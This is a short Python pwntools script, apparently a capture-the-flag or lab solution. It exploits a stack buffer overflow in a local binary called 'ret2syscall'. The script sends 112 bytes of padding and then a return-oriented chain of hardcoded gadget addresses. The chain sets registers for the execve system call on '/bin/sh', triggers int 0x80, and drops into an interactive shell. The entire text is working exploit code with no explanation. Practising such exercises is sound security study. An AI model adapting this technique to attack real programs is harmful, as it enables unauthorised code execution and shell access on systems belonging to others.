from pwn import *


code_execve = 11
addr_pop_eax_ret = 0x080bb196
addr_pop_edx_pop_ecx_pop_ebx_ret = 0x0806eb90
addr_bin_sh = 0x080be408
addr_int_0x80 = 0x08049421

pwn_obj = process("./ret2syscall")
pwn_obj.sendline(
    b"#" * 112 + 
    p32(addr_pop_eax_ret) + 
    p32(code_execve) + 
    p32(addr_pop_edx_pop_ecx_pop_ebx_ret) + 
    p32(0) + 
    p32(0) + 
    p32(addr_bin_sh) + 
    p32(addr_int_0x80))
pwn_obj.interactive()
